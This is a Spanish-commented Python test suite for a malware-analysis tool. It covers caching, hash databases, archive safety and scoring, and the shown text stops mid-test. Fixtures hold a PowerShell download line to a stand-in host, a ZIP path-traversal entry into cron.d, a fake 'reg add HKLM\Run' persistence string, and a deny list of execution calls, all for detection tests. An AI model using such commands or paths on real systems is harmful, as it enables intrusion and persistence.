
#!/usr/bin/env python3
# test_pythreatanalyzer.py
"""
Suite de verificación (prioridades + áreas v2 + importador fuzzy). Ejecutar:

    python3 test_pythreatanalyzer.py

No requiere pytest ni ningún framework externo — usa solo assert y la
librería estándar, para que puedas correrlo en cualquier máquina (Windows
o Linux) sin instalar nada adicional más allá de requirements.txt.

NOTA: el runner incluye las pruebas legacy, de regresión y de áreas v2.
"""

import ast
import os
import sys
import tempfile
import shutil
import struct

# Naked assert statements disappear under python -O. Refuse that mode so the
# runner cannot report a misleading PASS with every invariant compiled out.
if __name__ == '__main__' and not __debug__:
    raise RuntimeError("Ejecuta esta suite sin -O; optimización desactiva sus aserciones")

sys.path.insert(0, os.path.dirname(os.path.abspath(__file__)))


class SkipTest(Exception):
    """Resultado omitido del runner autónomo (incluye el motivo)."""


class SkipGuiTest(SkipTest):
    pass


def _skip_test(reason):
    if __name__ == '__main__':
        raise SkipTest(reason)
    try:
        import pytest
    except ImportError:
        raise SkipTest(reason)
    pytest.skip(reason)


def _require_tkinter():
    """R-07: main.py importa tkinter; sin él (contenedores slim, CI headless)
    estas pruebas se omiten en lugar de fallar con ModuleNotFoundError."""
    try:
        import tkinter  # noqa: F401
    except (ImportError, OSError):
        _skip_test("sin tkinter")


def _gui_root_or_skip():
    _require_tkinter()
    import tkinter as tk
    try:
        return tk.Tk()
    except tk.TclError as exc:
        _skip_test(f"sin display: {exc}")


def test_gui_open_close_with_display():
    root = _gui_root_or_skip()
    root.update_idletasks()
    root.destroy()


def test_gui_visible_with_display():
    root = _gui_root_or_skip()
    try:
        root.update_idletasks()
        assert root.winfo_viewable(), "la ventana Tk debe ser visible"
    finally:
        root.destroy()


def test_a3_schema_v1_in_json():
    import json
    from report_generator import ReportGenerator, REPORT_SCHEMA_VERSION
    report = ReportGenerator().generate_report('sample.bin', {}, {}, {})
    assert REPORT_SCHEMA_VERSION == 1
    assert next(iter(report)) == 'report_schema_version'
    with tempfile.TemporaryDirectory() as tmp:
        path = ReportGenerator().save_json(report, tmp)
        with open(path, encoding='utf-8') as stream:
            persisted = json.load(stream, object_pairs_hook=dict)
        assert next(iter(persisted)) == 'report_schema_version'
        assert persisted['report_schema_version'] == 1
        import cli
        cli_writer = cli.PyThreatAnalyzerCLI.__new__(cli.PyThreatAnalyzerCLI)
        cli_path = os.path.join(tmp, 'cli-report.json')
        cli_writer.export_json([{'file': 'sample.bin'}], cli_path)
        with open(cli_path, encoding='utf-8') as stream:
            cli_report = json.load(stream, object_pairs_hook=dict)
        assert next(iter(cli_report)) == 'report_schema_version'
        assert cli_report['report_schema_version'] == 1
        assert cli_report['results'][0]['file'] == 'sample.bin'

        from types import SimpleNamespace
        class _Engine:
            on_checkpoint = None
            def analyze_file(self, _path, hashes=None):
                return {
                    'reputation': {'database_status': {}}, 'whitelist': {},
                    'file_type': 'BINARY', 'hashes': hashes, 'risk_score': 0,
                    'risk_level': 'BAJO', 'indicators': [], 'layer_scores': {},
                    'explanation': {}, 'analysis_status': 'COMPLETE',
                    'analysis_warnings': [],
                }
        cli_scan = cli.PyThreatAnalyzerCLI.__new__(cli.PyThreatAnalyzerCLI)
        cli_scan.config = {'use_cache': False}
        cli_scan.force_rescan = False
        cli_scan.analyzer = SimpleNamespace(get_file_hashes=lambda _path: {'sha256': 'a' * 64})
        cli_scan.engine = _Engine()
        cli_scan.yara = SimpleNamespace(loaded_rule_count=1)
        cli_scan._coverage_warned = True
        input_path = os.path.join(tmp, 'sample.bin')
        with open(input_path, 'wb') as stream:
            stream.write(b'sample')
        scanned = cli_scan.scan_file(input_path)
        assert next(iter(scanned)) == 'report_schema_version'
        assert scanned['report_schema_version'] == 1


def test_fuzzy_empty_and_valid_databases_are_visible():
    from virus_analyzer import StaticAnalyzer
    from analysis_utils import coverage_gap_messages
    with tempfile.TemporaryDirectory() as tmp:
        paths = {key: os.path.join(tmp, name) for key, name in (
            ('hashes', 'malware_hashes.txt'), ('good', 'known_good_hashes.txt'),
            ('imphash', 'malware_imphashes.txt'), ('tlsh', 'malware_tlsh.txt'),
            ('ssdeep', 'malware_ssdeep.txt'))}
        for path in paths.values():
            open(path, 'w', encoding='utf-8').close()
        sample = os.path.join(tmp, 'sample.bin')
        with open(sample, 'wb') as stream:
            stream.write(b'A' * 2048)

        def analyzer():
            return StaticAnalyzer(paths['hashes'], paths['good'], paths['imphash'], None,
                                  paths['tlsh'], paths['ssdeep'])

        empty = analyzer()
        assert empty.known_bad_tlsh == set() and empty.known_bad_ssdeep == set()
        assert empty.check_reputation(sample) is not None
        gaps = coverage_gap_messages(
            tlsh_status=empty.database_status['malware_tlsh']['status'],
            ssdeep_status=empty.database_status['malware_ssdeep']['status'])
        assert any('TLSH vacía' in message for message in gaps), gaps
        assert any('ssdeep vacía' in message for message in gaps), gaps

        tlsh = 'T1' + 'A' * 70
        ssdeep = '3:YWJj:ZGVm'
        with open(paths['tlsh'], 'w', encoding='utf-8') as stream:
            stream.write(tlsh + '\n')
        with open(paths['ssdeep'], 'w', encoding='utf-8') as stream:
            stream.write(ssdeep + '\n')
        loaded = analyzer()
        assert loaded.known_bad_tlsh == {tlsh}
        assert loaded.known_bad_ssdeep == {ssdeep}
        assert loaded.database_status['malware_tlsh']['status'] == 'ready'
        assert loaded.database_status['malware_ssdeep']['status'] == 'ready'


def test_a3_sample_sha256_semantics():
    import hashlib
    from dynamic_analyzer import DynamicAnalyzer, MAX_READ_BYTES
    analyzer = DynamicAnalyzer()
    with tempfile.TemporaryDirectory() as tmp:
        for size in (5 * 1024, 10 * 1024 * 1024, 12 * 1024 * 1024, 0):
            path = os.path.join(tmp, f'sample-{size}.bin')
            data = b'A' * size
            with open(path, 'wb') as stream:
                stream.write(data)
            result = analyzer.analyze(path)
            expected = data[:MAX_READ_BYTES]
            assert result['sample_sha256'] == hashlib.sha256(expected).hexdigest()
        os.unlink(path)
        assert analyzer.analyze(path).get('error') == 'Archivo no existe'


def test_a4_v5_purged_v6_served():
    import json
    import sqlite3
    from datetime import datetime
    from analysis_cache import AnalysisCache, ENGINE_VERSION
    assert ENGINE_VERSION == 6
    with tempfile.TemporaryDirectory() as tmp:
        db = os.path.join(tmp, 'cache.db')
        cache = AnalysisCache(db)
        conn = sqlite3.connect(db)
        for digest, version in (('a' * 64, 5), ('b' * 64, 6), ('c' * 64, 7)):
            conn.execute('INSERT INTO analysis_results '
                         '(file_hash, file_path, analysis_date, engine_version, risk_level, report_json) '
                         'VALUES (?, ?, ?, ?, ?, ?)',
                         (digest, 'sample', datetime.now().isoformat(), version,
                          'BAJO', json.dumps({'version': version})))
        conn.commit()
        conn.close()
        cache.clear_stale_versions()
        assert cache.get('a' * 64) is None
        assert cache.get('b' * 64)['report']['version'] == 6
        assert cache.get('c' * 64) is None
        conn = sqlite3.connect(db)
        assert conn.execute('SELECT COUNT(*) FROM analysis_results WHERE file_hash = ?',
                            ('c' * 64,)).fetchone()[0] == 1
        conn.close()


def test_a4_future_version_preserved_not_served():
    import json
    import sqlite3
    from datetime import datetime
    from analysis_cache import AnalysisCache, ENGINE_VERSION
    with tempfile.TemporaryDirectory() as tmp:
        db = os.path.join(tmp, 'cache.db')
        cache = AnalysisCache(db)
        conn = sqlite3.connect(db)
        conn.execute('INSERT INTO analysis_results '
                     '(file_hash, file_path, analysis_date, engine_version, risk_level, report_json) '
                     'VALUES (?, ?, ?, ?, ?, ?)',
                     ('f' * 64, 'sample', datetime.now().isoformat(), ENGINE_VERSION + 1,
                      'BAJO', json.dumps({'future': True})))
        conn.commit()
        conn.close()
        cache.clear_stale_versions()
        assert cache.get('f' * 64) is None
        conn = sqlite3.connect(db)
        assert conn.execute('SELECT engine_version FROM analysis_results WHERE file_hash = ?',
                            ('f' * 64,)).fetchone()[0] == ENGINE_VERSION + 1
        conn.close()


def test_a4_old_engine_vs_new_cache():
    import json
    import sqlite3
    from datetime import datetime
    from analysis_cache import AnalysisCache, ENGINE_VERSION
    with tempfile.TemporaryDirectory() as tmp:
        db = os.path.join(tmp, 'cache.db')
        cache = AnalysisCache(db)
        conn = sqlite3.connect(db)
        conn.execute('INSERT INTO analysis_results '
                     '(file_hash, file_path, analysis_date, engine_version, risk_level, report_json) '
                     'VALUES (?, ?, ?, ?, ?, ?)',
                     ('e' * 64, 'sample', datetime.now().isoformat(), ENGINE_VERSION - 1,
                      'BAJO', json.dumps({'old': True})))
        conn.commit()
        conn.close()
        assert cache.get('e' * 64) is None


def test_a4_ttl_purge_independent_of_version():
    import json
    import sqlite3
    from datetime import datetime, timedelta
    from analysis_cache import AnalysisCache, ENGINE_VERSION
    with tempfile.TemporaryDirectory() as tmp:
        db = os.path.join(tmp, 'cache.db')
        cache = AnalysisCache(db, ttl_days=1)
        conn = sqlite3.connect(db)
        old = (datetime.now() - timedelta(days=2)).isoformat()
        conn.execute('INSERT INTO analysis_results '
                     '(file_hash, file_path, analysis_date, engine_version, risk_level, report_json) '
                     'VALUES (?, ?, ?, ?, ?, ?)',
                     ('d' * 64, 'sample', old, ENGINE_VERSION, 'BAJO', json.dumps({})))
        conn.commit()
        conn.close()
        cache.clear_expired()
        assert cache.get('d' * 64) is None


def test_a4_thread_connections_isolated():
    import threading
    from analysis_cache import AnalysisCache
    with tempfile.TemporaryDirectory() as tmp:
        cache = AnalysisCache(os.path.join(tmp, 'cache.db'))
        main_conn = cache._get_conn()
        seen = []
        def worker():
            worker_conn = cache._get_conn()
            seen.append(worker_conn)
            cache.close_thread_connection()
        thread = threading.Thread(target=worker)
        thread.start()
        thread.join()
        assert seen and seen[0] is not main_conn
        assert cache._get_conn() is main_conn
        cache.close_thread_connection()


def test_a5_zip_inventory_source():
    import zipfile
    import verificar_y_empaquetar as pack
    with tempfile.TemporaryDirectory() as tmp:
        path = os.path.join(tmp, 'source.zip')
        assert pack.make_zip(os.path.dirname(__file__), path)
        with zipfile.ZipFile(path) as archive:
            names = archive.namelist()
            assert names[0] == 'PyThreatAnalyzer/'
            assert 'PyThreatAnalyzer/.github/workflows/ci.yml' not in names
            assert not any(n.startswith('PyThreatAnalyzer/scripts/') for n in names)
            assert pack.phase_manifest_zip(names)


def test_a5_zip_inventory_full():
    import zipfile
    import verificar_y_empaquetar as pack
    with tempfile.TemporaryDirectory() as tmp:
        path = os.path.join(tmp, 'full.zip')
        assert pack.make_zip(os.path.dirname(__file__), path, full=True)
        with zipfile.ZipFile(path) as archive:
            assert any(n.startswith('PyThreatAnalyzer/data/yara_rules/') for n in archive.namelist())


def test_a5_phase_manifest_separation():
    import verificar_y_empaquetar as pack
    root = os.path.dirname(__file__)
    missing_repo_files = [
        name for name in pack.REPO_ONLY_FILES
        if not os.path.isfile(os.path.join(root, name))
    ]
    if missing_repo_files:
        _skip_test(
            "requiere árbol de repositorio; el ZIP de distribución excluye "
            + ', '.join(missing_repo_files)
        )
    assert pack.phase_manifest_repo(root)
    assert '.github/workflows/ci.yml' not in pack.REQUIRED_FILES
    assert '.github/workflows/ci.yml' in pack.REPO_ONLY_FILES


def test_a5_source_default_config():
    import json
    with open(os.path.join(os.path.dirname(__file__), 'config.json'), encoding='utf-8') as stream:
        config = json.load(stream)
    assert config['yara_rules_path'] == 'data/yara_rules/'
    assert config['malware_hashes_db'] == 'data/denylist/tweetfeed_sha256.txt'


def section(title):
    print("\n" + "=" * 70)
    print(title)
    print("=" * 70)


def test_audit_trends_hardening():
    section("REGRESIONES: cobertura, límites y errores de miembros")
    import io
    from types import SimpleNamespace
    import zipfile
    from analysis_utils import zip_member_count_from_eocd, collect_analysis_warnings
    from archive_analyzer import ArchiveAnalyzer
    from yara_engine import YARAEngine
    from virus_analyzer import StaticAnalyzer
    from analysis_cache import cache_report_matches_schema

    tmp_dir = tempfile.mkdtemp()
    try:
        archive_path = os.path.join(tmp_dir, 'members.zip')
        with zipfile.ZipFile(archive_path, 'w') as zf:
            zf.writestr('one.txt', 'one')
        assert zip_member_count_from_eocd(archive_path) == 1
        assert not ArchiveAnalyzer._is_safe_path(r'C:\\outside.txt')
        assert not ArchiveAnalyzer._is_safe_path('file.txt:stream')

        analyzer = ArchiveAnalyzer()
        result = analyzer.analyze_archive(
            archive_path, member_analyzer=lambda _path: {'error': 'test failure'})
        assert result.get('risk_level') == 'SOSPECHOSO'
        assert any('ANALISIS_MIEMBRO_INCOMPLETO' in p
                   for p in result.get('suspicious_patterns', []))
        analyzer.cleanup()

        import archive_analyzer as archive_module
        class FakeRarInfo:
            def __init__(self, name, payload=b'x', fail=False):
                self.filename, self.payload, self.fail = name, payload, fail
                self.file_size = len(payload)
            def needs_password(self): return False
            def is_dir(self): return False
        class FakeRarFile:
            def __init__(self, *_args, **_kwargs):
                self.entries = [
                    FakeRarInfo('same.txt', b'a'), FakeRarInfo('same.txt', b'b'),
                    FakeRarInfo('broken.txt', fail=True),
                    FakeRarInfo(r'C:\\outside.txt', b'c'),
                ]
            def __enter__(self): return self
            def __exit__(self, *_args): return False
            def infolist(self): return self.entries
            def open(self, info):
                if info.fail: raise RuntimeError('simulated member failure')
                return io.BytesIO(info.payload)
        old_rar = getattr(archive_module, 'rarfile', None)
        old_available = archive_module._RARFILE_AVAILABLE
        try:
            archive_module.rarfile = SimpleNamespace(RarFile=FakeRarFile)
            archive_module._RARFILE_AVAILABLE = True
            rar_analyzer = ArchiveAnalyzer()
            rar_result = rar_analyzer._analyze_rar('fake.rar', 0)
            assert rar_result['risk_level'] == 'SOSPECHOSO'
            assert len(rar_analyzer._extracted_files) == 2
            assert rar_analyzer._extracted_files[0].path != rar_analyzer._extracted_files[1].path
            assert any('Ruta insegura en RAR' in p for p in rar_result['suspicious_patterns'])
            rar_analyzer.cleanup()
        finally:
            archive_module.rarfile, archive_module._RARFILE_AVAILABLE = old_rar, old_available

        assert YARAEngine._meta_flag('false') is False
        assert YARAEngine._meta_flag('true') is True
        assert cache_report_matches_schema({'_cache_schema': 'gui-report-v1'}, 'gui-report-v1')
        assert not cache_report_matches_schema({'_cache_schema': 'gui-report-v1'}, 'cli-report-v1')

        import yara_engine
        old_yara = yara_engine.yara
        class TimeoutRules:
            def match(self, _path, timeout=None):
                assert timeout == 10
                raise TimeoutError('simulated timeout')
        try:
            yara_engine.yara = object()
            engine = YARAEngine.__new__(YARAEngine)
            engine.rules_path = 'test-rules'
            engine.timeout_seconds = 10
            engine.rules = TimeoutRules()
            engine.loaded_rule_count = 1
            engine.skipped_rules = []
            assert 'error' in engine.scan('unused-sample.bin')
        finally:
            yara_engine.yara = old_yara

        db_path = os.path.join(tmp_dir, 'hashes.txt')
        with open(db_path, 'w', encoding='utf-8') as f:
            f.write('   # comentario\n' + 'a' * 64 + '\n')
        static = StaticAnalyzer(db_path, db_path, db_path, None, db_path, db_path)
        assert static.known_bad_hashes == {'a' * 64}
        string_path = os.path.join(tmp_dir, 'strings.bin')
        with open(string_path, 'wb') as f:
            f.write(b'powershell -c download http://example.invalid/a')
        strings = static.extract_strings(string_path)
        assert strings['urls'] and strings['suspicious_commands']

        import document_analyzer as document_module
        old_office_available = document_module._OLETOOLS_AVAILABLE
        old_vba_parser = getattr(document_module, 'VBA_Parser', None)
        office_path = os.path.join(tmp_dir, 'large.docx')
        with open(office_path, 'wb') as f:
            f.truncate(document_module.MAX_OFFICE_ANALYSIS_SIZE + 1)
        try:
            document_module._OLETOOLS_AVAILABLE = True
            document_module.VBA_Parser = lambda *_args, **_kwargs: (_ for _ in ()).throw(
                AssertionError('VBA_Parser no debió abrir un archivo sobre el límite'))
            office_result = document_module.DocumentAnalyzer()._analyze_office(office_path)
            assert office_result.get('truncated') and office_result.get('error')
        finally:
            document_module._OLETOOLS_AVAILABLE = old_office_available
            document_module.VBA_Parser = old_vba_parser

        warnings = collect_analysis_warnings(
            {'database_status': {'malware_hashes': {'status': 'empty'}}},
            {'error': 'rules absent'},
            static_analysis={'error': 'PE parser failed'},
        )
        assert len(warnings) == 3
        assert any('Análisis estático incompleto' in warning for warning in warnings)
        print("✅ Caché, ZIP preflight, rutas RAR, errores de miembros, timeout YARA y cobertura")
    finally:
        shutil.rmtree(tmp_dir, ignore_errors=True)

# =====================================================================
# ÁREAS NUEVAS v2: motor robusto, entropía avanzada, archivos comprimidos,
# imphash, trust decay, score por capas
# =====================================================================
def test_area1_magic_bytes_and_type_mismatch():
    section("ÁREA 1: magic bytes (nunca extensión) + mismatch")
    from file_type_detector import FileTypeDetector, RealFileType

    tmp_dir = tempfile.mkdtemp()
    try:
        # PE estructuralmente válido renombrado a .bin → detectar por firma.
        pe_renamed = os.path.join(tmp_dir, 'programa_renombrado.bin')
        pe_sample = bytearray(0x98)
        pe_sample[0:2] = b'MZ'
        pe_sample[0x3C:0x40] = struct.pack('<I', 0x80)
        pe_sample[0x80:0x84] = b'PE\x00\x00'
        pe_sample[0x84:0x86] = struct.pack('<H', 0x8664)
        with open(pe_renamed, 'wb') as f:
            f.write(pe_sample)
        ft = FileTypeDetector.detect(pe_renamed)
        assert ft == RealFileType.PE64, \
            f"PE64 válido renombrado debe detectarse por magic bytes, fue {ft}"
        print("✅ 1a. PE64 válido renombrado a .bin → detectado por magic bytes")

        invalid_mz = os.path.join(tmp_dir, 'mz_basura.bin')
        with open(invalid_mz, 'wb') as f:
            f.write(b'MZ' + b'\x00' * 100)
        assert FileTypeDetector.detect(invalid_mz) == RealFileType.BINARY, \
            "Una cabecera MZ sin firma PE no debe tratarse como ejecutable"
        print("✅ 1a-2. MZ sin firma PE → rechazado como BINARY")

        # ZIP con extensión .exe → debe detectarse como ZIP (malware renombrado)
        import zipfile
        fake_exe = os.path.join(tmp_dir, 'documento.exe')
        with zipfile.ZipFile(fake_exe, 'w') as zf:
            zf.writestr('file.txt', 'contenido')
        ft = FileTypeDetector.detect(fake_exe)
        assert ft == RealFileType.ZIP, f"ZIP con extensión .exe debe detectarse ZIP, fue {ft}"
        print("✅ 1b. ZIP con extensión .exe → detectado como ZIP (evasión por renombre)")

        # NSRL: hash SHA1 en base NSRL → whitelist
        nsrl_path = os.path.join(tmp_dir, 'nsrl.txt')
        good_file = os.path.join(tmp_dir, 'soft.bin')
        with open(good_file, 'wb') as f:
            f.write(b'software legitimo')
        from virus_analyzer import StaticAnalyzer
        sa = StaticAnalyzer(os.path.join(tmp_dir, 'bad.txt'),
                            os.path.join(tmp_dir, 'good.txt'),
                            os.path.join(tmp_dir, 'imp.txt'),
                            nsrl_path)
        h = sa.get_file_hashes(good_file)
        with open(nsrl_path, 'w') as f:
            f.write(h['sha1'] + '\n')
        sa.known_nsrl_hashes.add(h['sha1'])
        wl = sa.check_whitelist(good_file, hashes=h)
        assert wl['is_whitelisted'] and wl['method'] == 'nsrl'
        print("✅ 1c. Hash en NSRL → whitelisted (method=nsrl)")
    finally:
        shutil.rmtree(tmp_dir, ignore_errors=True)


def test_area1b_imphash_separate_db():
    section("ÁREA 1b: imphash contra base DEDICADA (fix bug cli.py)")
    from virus_analyzer import StaticAnalyzer

    tmp_dir = tempfile.mkdtemp()
    try:
        fake_imphash = 'a' * 32  # formato imphash (= md5-like)
        bad_hashes = os.path.join(tmp_dir, 'bad.txt')
        imp_db = os.path.join(tmp_dir, 'imphashes.txt')

        # El imphash NO está en la base de imphashes pero SÍ está como
        # "hash de archivo malicioso" (simula el bug original: un md5 de
        # archivo que casualmente coincide con el string del imphash)
        with open(bad_hashes, 'w') as f:
            f.write(fake_imphash + '\n')
        open(imp_db, 'w').close()

        sa = StaticAnalyzer(bad_hashes, os.path.join(tmp_dir, 'good.txt'), imp_db)
        assert sa.check_imphash(fake_imphash)['match'] is False, \
            "BUG: imphash matcheó contra hashes de archivo"
        print("✅ 1d. Imphash NO coincide con hashes de archivo (bug cli.py corregido)")

        with open(imp_db, 'w') as f:
            f.write(fake_imphash + '\n')
        sa.known_bad_imphashes = sa._load_hash_set(imp_db)
        assert sa.check_imphash(fake_imphash)['match'] is True
        print("✅ 1e. Imphash SÍ coincide contra su base dedicada")
    finally:
        shutil.rmtree(tmp_dir, ignore_errors=True)


def test_area2_entropy_windows_and_compression():
    section("ÁREA 2: entropía por ventanas + compresibilidad")
    from virus_analyzer import StaticAnalyzer, get_advanced_features

    tmp_dir = tempfile.mkdtemp()
    try:
        # Cabecera legible (entropía baja) + payload aleatorio (entropía alta)
        packed = os.path.join(tmp_dir, 'packed.bin')
        with open(packed, 'wb') as f:
            f.write(b'MZ' + b'\x00' * 8192)        # entropía ~0
            f.write(os.urandom(64 * 1024))          # entropía ~8

        sa = StaticAnalyzer(os.path.join(tmp_dir, 'b'), os.path.join(tmp_dir, 'g'))
        adv = get_advanced_features(sa)
        ew = adv.analyze_entropy_windows(packed)
        assert ew.get('suspicious_transitions', 0) >= 1, \
            "Debe detectar la transición cabecera_baja->payload_alto"
        print(f"✅ 2a. Transición de entropía detectada (n={ew['suspicious_transitions']}, "
              f"máx={ew['max_entropy']})")

        comp = adv.test_compression_ratio(packed)
        assert comp['likely_packed'] is True, "Datos aleatorios no deben ser compressibles"
        print(f"✅ 2b. Compresibilidad: ratio={comp['ratio']} → likely_packed=True")

        zeros = os.path.join(tmp_dir, 'zeros.bin')
        with open(zeros, 'wb') as f:
            f.write(b'\x00' * 1024 * 1024)
        comp2 = adv.test_compression_ratio(zeros)
        assert comp2['compressible'] is True and comp2['likely_packed'] is False
        print("✅ 2c. Datos repetitivos: compressible=True (sin falso positivo)")
    finally:
        shutil.rmtree(tmp_dir, ignore_errors=True)


def test_area3_archives():
    section("ÁREA 3: archivos comprimidos (anti-zip-bomb, traversal, contraseña)")
    import zipfile
    from archive_analyzer import (ArchiveAnalyzer, ArchiveLimits,
                                  ZipBombDetectedError, analyze_compressed_file)

    tmp_dir = tempfile.mkdtemp()
    try:
        # --- Path traversal: se detecta y NO se extrae ---
        evil_zip = os.path.join(tmp_dir, 'evil.zip')
        with zipfile.ZipFile(evil_zip, 'w') as zf:
            zf.writestr('../../etc/cron.d/backdoor', 'payload')
            zf.writestr('legit.txt', 'ok')
        res = analyze_compressed_file(evil_zip, member_analyzer=None)
        assert any('path traversal' in p for p in res['suspicious_patterns']), \
            "Debe reportar la ruta insegura"
        # FIX #2: eliminado dead code (era un for sobre _extracted_files vacío).
        # Verificación real: ningún nombre extraído contiene '..' o '/' inicial.
        with ArchiveAnalyzer() as an:
            res2 = an.analyze_archive(evil_zip)
            names = [f.name for f in an.get_extracted_files()]
            assert not any('..' in n or n.startswith('/') for n in names)
            assert not any('backdoor' in os.path.basename(f.path) and '..' in f.name
                           for f in an.get_extracted_files())
        print("✅ 3a. Path traversal detectado y NO extraído (sin extractall)")

        # --- Zip bomb: límite de tamaño total configurable ---
        bomb_zip = os.path.join(tmp_dir, 'bomb.zip')
        with zipfile.ZipFile(bomb_zip, 'w', zipfile.ZIP_DEFLATED) as zf:
            zf.writestr('zeros.bin', b'\x00' * (8 * 1024 * 1024))  # 8MB de ceros
        res3 = analyze_compressed_file(bomb_zip, limits=ArchiveLimits(max_total_size=1024))
        assert res3.get('risk_level') == 'CRÍTICO'
        assert any('ZIP_BOMB' in p or 'excede límite' in (res3.get('error') or '') + ' '.join(res3.get('suspicious_patterns', []))
                   for p in res3.get('suspicious_patterns', [res3.get('error', '')]))
        print("✅ 3b. Zip bomb detectada por límite de tamaño → CRÍTICO")

        # --- ZIP con contraseña: marcado SOSPECHOSO (flag bit parcheado) ---
        pwd_zip = os.path.join(tmp_dir, 'pwd.zip')
        with zipfile.ZipFile(pwd_zip, 'w') as zf:
            zf.writestr('secret.exe', b'fake')
        # Parchear flag_bits de cifrado en el central directory
        with open(pwd_zip, 'r+b') as f:
            data = f.read()
            idx = 0
            while True:
                idx = data.find(b'PK\x01\x02', idx)
                if idx == -1:
                    break
                flags = int.from_bytes(data[idx+8:idx+10], 'little') | 0x1
                f.seek(idx+8)
                f.write(flags.to_bytes(2, 'little'))
                idx += 4
        res4 = analyze_compressed_file(pwd_zip, member_analyzer=None)
        assert res4['is_password_protected'] is True
        assert res4['risk_level'] in ('SOSPECHOSO', 'MEDIO', 'ALTO', 'CRÍTICO')
        print("✅ 3c. ZIP con contraseña → is_password_protected=True, SOSPECHOSO")

        # --- Anidados: recursión con agregación de riesgo ---
        inner = os.path.join(tmp_dir, 'inner.zip')
        with zipfile.ZipFile(inner, 'w') as zf:
            zf.writestr('data.txt', 'x')
        outer = os.path.join(tmp_dir, 'outer.zip')
        with zipfile.ZipFile(outer, 'w') as zf:
            zf.write(inner, 'nested/inner.zip')
        res5 = analyze_compressed_file(outer, member_analyzer=None)
        assert res5.get('nested_analysis'), "Debe recursar en el ZIP anidado"
        assert res5.get('depth', 0) == 0
        print("✅ 3d. ZIP anidado desempaquetado recursivamente (agregación de riesgo)")
    finally:
        shutil.rmtree(tmp_dir, ignore_errors=True)


def test_area4_scoring_new_layers():
    section("ÁREA 4/5: scoring con imphash, entropy_windows, archive_analysis, overlay")
    from risk_scoring import calculate_risk_score

    base = {'reputation': {'sha256_match': False, 'md5_match': False},
            'whitelist': {'is_whitelisted': False}}

    # imphash match suma
    v_imp = dict(base, reputation={'sha256_match': False, 'md5_match': False, 'imphash_match': True})
    s_imp, _, ind_imp = calculate_risk_score(v_imp)
    assert s_imp >= 30 and any('IMPHASH' in i for i in ind_imp)
    print(f"✅ 4a. Imphash match: score={s_imp} (>=30)")

    # transiciones de entropía suman
    v_ent = dict(base, entropy_windows={'suspicious_transitions': 2, 'max_entropy': 7.9})
    s_ent, _, ind_ent = calculate_risk_score(v_ent)
    assert s_ent >= 10 and any('ENTROPY_TRANSITIONS' in i for i in ind_ent)
    print(f"✅ 4b. Entropy windows: score={s_ent}, indicadores={ind_ent}")

    # archivo comprimido con contraseña suma
    v_arch = dict(base, archive_analysis={'is_password_protected': True,
                                          'risk_level': 'SOSPECHOSO',
                                          'suspicious_patterns': ['contraseña']})
    s_arch, _, ind_arch = calculate_risk_score(v_arch)
    assert s_arch >= 30 and any('ARCHIVE_PASSWORD' in i for i in ind_arch)
    print(f"✅ 4c. Archive password: score={s_arch}")

    # overlay con PE embebido suma
    v_ov = dict(base, overlay={'is_suspicious': True, 'size': 5000, 'entropy': 7.8,
                               'is_pe': True, 'is_zip': False, 'offset': 1024})
    s_ov, _, ind_ov = calculate_risk_score(v_ov)
    assert s_ov >= 35 and any('OVERLAY_CONTAINS_PE' in i for i in ind_ov)
    print(f"✅ 4d. Overlay con PE: score={s_ov}")


def test_area6_trust_decay_and_layer_scores():
    section("ÁREA 6: trust decay (90 días) + score por capa en reporte")
    from analysis_cache import AnalysisCache

    tmp_dir = tempfile.mkdtemp()
    try:
        db = os.path.join(tmp_dir, 'cache.db')
        cache = AnalysisCache(db, ttl_days=30, trust_decay_days=90)
        fh = 'c' * 64
        cache.set(fh, '/x.exe', 'BAJO', {'dummy': True})

        cache.set_whitelist_with_expiry(fh, expiry_days=90)
        assert cache.is_whitelist_expired(fh) is False
        print("✅ 6a. Whitelist vigente a 90 días")

        cache.set_whitelist_with_expiry(fh, expiry_days=0)
        import time
        time.sleep(1.1)
        assert cache.is_whitelist_expired(fh) is True
        result = cache.get_with_trust_decay(fh)
        assert result is None, "Trust decay expirado debe invalidar la entrada"
        print("✅ 6b. Trust decay expirado → entrada invalidada automáticamente")
    finally:
        shutil.rmtree(tmp_dir, ignore_errors=True)

    # Score por capa expuesto en reporte (fix report_generator)
    from report_generator import ReportGenerator
    rg = ReportGenerator()
    report = rg.generate_report('/tmp/x.exe',
                                {'reputation': {'imphash_match': True},
                                 'whitelist': {'is_whitelisted': False}},
                                {}, {})
    ls = report['summary']['layer_scores']
    assert 'hash' in ls and 'entropy' in ls and 'archive' in ls and 'overlay' in ls, \
        "layer_scores debe incluir todas las capas"
    print("✅ 6c. Reporte expone layer_scores con todas las capas")

    # Explanation engine produce MITRE
    from explanation_engine import ExplanationEngine
    ex = ExplanationEngine()
    ex.add_overlay_explanation(size=4096, entropy=7.8, offset=2048)
    summary = ex.generate_summary()
    assert summary['mitre_techniques'], "Debe mapear a MITRE ATT&CK"
    print(f"✅ 6d. Explainable AI: MITRE={summary['mitre_techniques']}")



# ---------------------------------------------------------------------
# PRIORIDAD 1 (ALTA): dynamic_analyzer.py nunca ejecuta el archivo
# ---------------------------------------------------------------------
def test_priority1_no_execution():
    section("PRIORIDAD 1: dynamic_analyzer.py nunca ejecuta código")

    src_path = os.path.join(os.path.dirname(__file__), 'dynamic_analyzer.py')
    with open(src_path, 'r', encoding='utf-8') as f:
        tree = ast.parse(f.read())

    banned_calls = {'eval', 'exec', 'compile'}
    banned_modules = {'subprocess'}
    banned_os_attrs = {'system', 'popen', 'execl', 'execle', 'execlp', 'execlpe',
                        'execv', 'execve', 'execvp', 'execvpe', 'posix_spawn'}
    violations = []

    for node in ast.walk(tree):
        if isinstance(node, ast.Import):
            for alias in node.names:
                if alias.name.split('.')[0] in banned_modules:
                    violations.append(f"import {alias.name} (línea {node.lineno})")
        if isinstance(node, ast.ImportFrom) and node.module and node.module.split('.')[0] in banned_modules:
            violations.append(f"from {node.module} import ... (línea {node.lineno})")
        if isinstance(node, ast.Call):
            if isinstance(node.func, ast.Name) and node.func.id in banned_calls:
                violations.append(f"{node.func.id}() (línea {node.lineno})")
            if isinstance(node.func, ast.Attribute) and node.func.attr in banned_os_attrs:
                violations.append(f"os.{node.func.attr}() (línea {node.lineno})")

    assert not violations, f"¡Se encontraron primitivas de ejecución prohibidas!: {violations}"
    print("✅ 1a. AST confirma: sin subprocess/eval/exec/compile/os.system/os.exec* en dynamic_analyzer.py")

    from dynamic_analyzer import DynamicAnalyzer

    with tempfile.NamedTemporaryFile(suffix='.exe', delete=False) as f:
        f.write(b"MZ fake executable payload http://evil.example.com reg add HKLM\\Run")
        test_file = f.name

    try:
        da = DynamicAnalyzer()
        result = da.analyze(test_file)
